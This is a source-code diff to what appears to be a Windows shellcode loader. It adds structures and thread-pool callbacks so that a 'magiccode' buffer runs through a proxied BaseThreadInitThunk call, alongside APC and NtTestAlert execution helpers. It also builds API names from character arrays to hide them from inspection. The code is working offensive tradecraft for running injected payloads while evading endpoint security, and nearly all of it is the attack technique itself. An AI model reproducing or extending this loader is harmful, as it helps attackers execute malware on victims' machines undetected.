@@ -36,6 +36,12 @@ typedef struct _NTWRITEVIRTUALMEMORY_ARGS {
 } NTWRITEVIRTUALMEMORY_ARGS, *PNTWRITEVIRTUALMEMORY_ARGS;
 
 
+typedef ULONG (NTAPI *RtlUserThreadStart_t)(PTHREAD_START_ROUTINE BaseAddress, PVOID Context);
+RtlUserThreadStart_t pRtlUserThreadStart = NULL;
+
+typedef ULONG (WINAPI *BaseThreadInitThunk_t)(DWORD LdrReserved, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter);
+BaseThreadInitThunk_t pBaseThreadInitThunk = NULL;
+
 // typedef NTSTATUS(NTAPI* myNtTestAlert)(
 //     VOID
 // );
@@ -62,6 +68,20 @@ typedef struct _NTQUEUEAPCTHREADEX_ARGS {
     // PVOID SystemArgument3;                  // PVOID SystemArgument3 - stack pointer
 } NTQUEUEAPCTHREADEX_ARGS, *PNTQUEUEAPCTHREADEX_ARGS;
 
+
+typedef struct _RTLTHREADSTART_ARGS {
+    UINT_PTR pRtlUserThreadStart;        // pointer to RtlUserThreadStart - rax
+    PTHREAD_START_ROUTINE pThreadStartRoutine; // PTHREAD_START_ROUTINE BaseAddress - rcx
+    PVOID pContext;                      // PVOID Context - rdx
+} RTLTHREADSTART_ARGS, *PRTLTHREADSTART_ARGS;
+
+typedef struct _BASETHREADINITTHUNK_ARGS {
+    UINT_PTR pBaseThreadInitThunk;       // pointer to BaseThreadInitThunk - rax
+    DWORD LdrReserved;                   // DWORD LdrReserved - rcx
+    LPTHREAD_START_ROUTINE lpStartAddress; // LPTHREAD_START_ROUTINE lpStartAddress - rdx
+    LPVOID lpParameter;                  // LPVOID lpParameter - r8
+} BASETHREADINITTHUNK_ARGS, *PBASETHREADINITTHUNK_ARGS;
+
 typedef NTSTATUS (NTAPI *NtQueueApcThreadEx_t)(
     HANDLE ThreadHandle,
     HANDLE UserApcReserveHandle, // Additional parameter in Ex2
@@ -70,11 +90,14 @@ typedef NTSTATUS (NTAPI *NtQueueApcThreadEx_t)(
 );
 
 
+
 extern "C" {
     VOID CALLBACK IWillBeBack(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
     VOID CALLBACK WriteProcessMemoryCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
     VOID CALLBACK NtQueueApcThreadCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
     VOID CALLBACK NtTestAlertCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
+    VOID CALLBACK RtlUserThreadStartCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
+    VOID CALLBACK BaseThreadInitThunkCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
 }
 
 
@@ -166,20 +189,50 @@ int main(int argc, char *argv[]) {
     //// Execution part: 
 
 
-    /// 2. Set workers to execute code, only works for local address, we may run a trampoline code to execute remote code: 
-    PTP_WORK WorkReturn4 = NULL;
+    const char BaseThreadInitStr[] = { 'B', 'a', 's', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 'I', 'n', 'i', 't', 'T', 'h', 'u', 'n', 'k', 0 };
+    BASETHREADINITTHUNK_ARGS BaseThreadInitArgs = { 0 };
+    BaseThreadInitArgs.pBaseThreadInitThunk = (UINT_PTR) GetProcAddress(GetModuleHandleA("kernel32"), BaseThreadInitStr);
+    BaseThreadInitArgs.LdrReserved = 0;
+    BaseThreadInitArgs.lpStartAddress = (LPTHREAD_START_ROUTINE)((char*)allocatedAddress);
+    // BaseThreadInitArgs.lpParameter = NULL;
+
+
+    // // / Set workers
+
+    PTP_WORK WorkReturn5 = NULL;
     // getchar();
-    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn4, (PTP_WORK_CALLBACK)allocatedAddress, NULL, NULL);
-    ((TPPOSTWORK)pTpPostWork)(WorkReturn4);
-    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn4);
-    printf("[+] magiccode executed. \n");
-    // Wait for the magiccode to execute
+    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn5, (PTP_WORK_CALLBACK)BaseThreadInitThunkCustom, &BaseThreadInitArgs, NULL);
+    ((TPPOSTWORK)pTpPostWork)(WorkReturn5);
+    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn5);
+    // printf("Bytes written: %lu\n", bytesWritten);
+    if(WorkReturn5 == NULL) {
+        printf("[-] Failed to BaseThreadInitThunkCustom\n");
+    } else {
+        printf("[+] BaseThreadInitThunkCustom executed.\n");
+    }
+
     DWORD waitResult = WaitForSingleObject((HANDLE)-1, INFINITE); // Use a reasonable timeout as needed
     if (waitResult == WAIT_OBJECT_0) {
         printf("[+] magiccode execution completed\n");
     } else {
         printf("[-] magiccode execution wait failed\n");
     }
+
+
+    // /// 2. Set workers to execute code, only works for local address, we may run a trampoline code to execute remote code: 
+    // PTP_WORK WorkReturn4 = NULL;
+    // // getchar();
+    // ((TPALLOCWORK)pTpAllocWork)(&WorkReturn4, (PTP_WORK_CALLBACK)allocatedAddress, NULL, NULL);
+    // ((TPPOSTWORK)pTpPostWork)(WorkReturn4);
+    // ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn4);
+    // printf("[+] magiccode executed. \n");
+    // // Wait for the magiccode to execute
+    // DWORD waitResult = WaitForSingleObject((HANDLE)-1, INFINITE); // Use a reasonable timeout as needed
+    // if (waitResult == WAIT_OBJECT_0) {
+    //     printf("[+] magiccode execution completed\n");
+    // } else {
+    //     printf("[-] magiccode execution wait failed\n");
+    // }
 
     // 3. APC execution:     
     // const char NtQueueFutureApcEx2Str[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', '2', 0 };
